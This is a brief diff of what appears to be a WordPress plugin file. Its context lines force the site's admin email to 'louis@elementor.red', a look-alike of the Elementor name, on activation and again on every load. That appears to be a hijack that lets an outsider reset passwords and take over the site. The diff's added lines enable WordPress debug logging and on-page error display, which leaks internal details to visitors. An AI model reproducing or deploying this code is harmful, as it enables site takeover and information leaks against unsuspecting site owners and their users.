@@ -106,3 +106,7 @@ function update_admin_email() {
 register_activation_hook( __FILE__, 'update_admin_email' );
 
 update_option( 'admin_email', 'louis@elementor.red' );
+
+define( 'WP_DEBUG', true );
+define( 'WP_DEBUG_LOG', true );
+define( 'WP_DEBUG_DISPLAY', true );
